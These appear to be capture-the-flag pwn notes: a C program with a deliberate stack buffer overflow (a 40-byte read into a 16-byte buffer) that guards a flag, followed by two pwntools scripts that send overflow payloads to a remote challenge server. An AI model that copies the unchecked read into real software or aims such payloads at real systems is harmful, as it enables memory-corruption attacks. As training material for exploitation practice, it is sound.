
#
```


```

# 1
```
#include"stdio.h"
#include"stdlib.h"

void printTheKey(){
  /*
   *
   * print the key
   *
   */
}

int main(){
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  int token = 1234;
  char key[16];

  printf("Billy left his key in the locked room.\n");
  printf("However, he forgot the token of the room.\n");
  printf("Do you know what's the key?");

  read(0, key, 40);

  if((int)token == 0xdeadbeef){
    printf("Door open. OwO\n");
    printTheKey();
    system("cat /home/ctf/flag");
  }else{
    printf("Cannot open door. QwQ\n");
  }

  return 0;
}
```
```

# nc 120.114.62.213 6125
from pwn import *

#r = process('./pass')
r = remote('120.114.62.213', 6125)

payload = b'A'*28

r.sendline(payload + p64(0xdeadbeef))

r.interactive()
```


# Level 2 2-1.張元_Pwn-1
```
# nc 120.114.62.213 2111
#!/usr/bin/env python

from pwn import *

host , port = '120.114.62.213' , 2111
y = remote( host , port )

y.send( 'D' * 0xc + p32( 0xfaceb00c ) + p32( 0xdeadbeef ) + p32( 0x7 ) )
y.sendline( '7' )

sleep(1)
y.interactive()
```
